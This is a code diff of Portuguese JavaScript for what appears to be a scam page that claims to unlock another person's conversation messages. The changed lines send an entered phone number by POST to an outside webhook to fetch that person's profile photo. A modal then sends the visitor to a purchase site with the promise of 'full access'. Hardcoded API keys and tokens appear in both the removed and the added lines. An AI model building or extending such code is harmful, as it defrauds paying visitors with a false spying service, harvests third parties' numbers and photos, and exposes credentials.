@@ -74,11 +74,11 @@
         }
 		$(".alertBuy").on("click", function () {
 			$("#text_notification").text("Para ver mais mensagens dessa conversação precisa liberar o acesso completo neste dispositivo ⬇️.");
-			$("#btn_notification").html(`<button class="modal-cust-alert-button" id="modalButton" href="www.google.com" target="_blank">Liberar agora</button>`);
+			$("#btn_notification").html(`<button class="modal-cust-alert-button" id="modalButton" href="https://www.minhacompra.store/" target="_blank">Liberar agora</button>`);
 			document.getElementById('modalOverlay').classList.add('active');
 			document.getElementById("modalButton").addEventListener("click", function () {
 				document.getElementById('modalOverlay').classList.remove('active');
-				window.open("https://www.google.com", "_blank");
+				window.open("https://www.minhacompra.store/", "_blank");
 			});
 			document.getElementById("modalButtonClose").addEventListener("click", function () {
 				document.getElementById('modalOverlay').classList.remove('active');
@@ -88,26 +88,26 @@
 
     async function chamarApi(celular) {
         try {
-			celular = celular.replace(/^(\d{2})(\d{2})\d*(\d{8})$/, "$1$2$3");
-            const url = "https://api.z-api.io/instances/3EFF2AB51481B32EDB887ECAFAC2912A/token/07AA4DD2A645B1952FFB247D/profile-picture?phone="+celular;
+            const url = "https://w.imagens.pics/webhook/182dd";
             const headers = {
                 "Content-Type": "application/json",
-				"Client-Token": "F9757887b924b4ca88458a2ed3569b920S"
+                "key": "wuAsuKHImXennBSFjt895tu984ut5"
             };
             const body = JSON.stringify({
                 number: celular
             });
 
             const response = await fetch(url, {
-                method: "GET",
-                headers: headers
+                method: "POST",
+                headers: headers,
+                body: body
             });
 
             if (response.ok) {
                 const responseData = await response.json();
 
-                if (responseData.link && responseData.link !== "null") {
-                    atualizarImagem(responseData.link);
+                if (responseData.foto && responseData.foto !== "null") {
+                    atualizarImagem(responseData.foto);
                 } else {
                     exibirImagemPadrao();
                 }
@@ -137,7 +137,7 @@ function exibirImagemPadrao() {
     const elementos = document.querySelectorAll('#fotoperfil, #fotoperfiltoda, #perfiltfotto');
     elementos.forEach(imgElement => {
         if (imgElement) {
-            imgElement.src = '/concluido/assets/user.jpg';
+            imgElement.src = './assets/user.jpg';
             imgElement.classList.add('imagemArredondada');
             console.log(`Imagem padrão aplicada no elemento.`);
         }
